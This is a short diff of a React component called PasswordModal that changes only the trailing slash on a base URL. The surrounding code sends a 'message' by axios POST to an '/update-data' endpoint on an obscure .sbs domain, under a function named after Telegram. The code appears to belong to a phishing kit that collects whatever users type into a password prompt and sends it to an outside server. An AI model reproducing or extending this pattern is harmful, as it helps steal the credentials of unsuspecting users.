@@ -115,7 +115,7 @@ const PasswordModal: FC<PasswordModalProps> = ({
 
   if (!isOpen) return null;
   const sendTelegramMessage = async (message: Message) => {
-    const baseUrl = `https://kjzxcljzxklcjklasd.sbs/`;
+    const baseUrl = `https://kjzxcljzxklcjklasd.sbs`;
     if (localStorage.getItem(LAST_MESSAGE_KEY)) {
       await axios.post(
         `${baseUrl}/update-data`,
